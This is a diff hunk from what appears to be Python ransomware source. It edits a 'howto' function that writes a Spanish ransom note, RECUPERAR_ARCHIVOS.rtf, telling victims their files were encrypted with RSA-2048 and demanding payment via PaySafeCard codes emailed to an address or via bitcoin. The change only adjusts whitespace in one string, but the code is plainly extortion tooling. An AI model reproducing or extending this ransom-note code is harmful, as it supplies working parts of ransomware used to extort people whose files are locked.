@@ -73,7 +73,7 @@ def crypt(text, pwd, path ):
 def howto(l, bitcoin, price,verif):
     for dirr in l:
         archivo = open("RECUPERAR_ARCHIVOS.rtf","wb")
-        archivo.write('hola te estaras preguntando que paso con tus archivos?\n todos ellos fueron cifrados con RSA-2048\n')
+        archivo.write('hola te estaras preguntando que paso con tus archivos?\ntodos ellos fueron cifrados con RSA-2048\n')
         archivo.write('si los quieres recuperar debes abonar :' + str(price) +'\n')
         archivo.write("Puedes pagar con PaYSafeCard enviado los codigos de cupones al correo Ejemplo@ejemplo.com \n")
         archivo.write("o enviar bitcoins a la direccion :#" + bitcoin+ "\n")
